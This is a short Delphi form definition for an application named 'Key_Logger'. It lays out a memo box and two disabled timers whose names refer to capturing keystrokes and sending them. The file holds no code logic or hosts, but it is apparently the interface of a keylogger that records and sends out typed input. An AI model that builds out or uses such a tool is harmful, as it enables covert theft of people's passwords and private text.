object Key_Logger: TKey_Logger
  Left = 0
  Top = 0
  Caption = 'Key_Logger'
  ClientHeight = 299
  ClientWidth = 635
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  OldCreateOrder = False
  OnCreate = FormCreate
  OnDestroy = FormDestroy
  PixelsPerInch = 96
  TextHeight = 13
  object MemoTeclas: TMemo
    Left = 0
    Top = 0
    Width = 635
    Height = 299
    Align = alClient
    ScrollBars = ssBoth
    TabOrder = 0
  end
  object TimerCapturaKeyLogs: TTimer
    Enabled = False
    Interval = 0
    OnTimer = TimerCapturaKeyLogsTimer
    Left = 96
    Top = 40
  end
  object TimerEnviarKeyLogger: TTimer
    Enabled = False
    Interval = 0
    OnTimer = TimerEnviarKeyLoggerTimer
    Left = 96
    Top = 104
  end
end
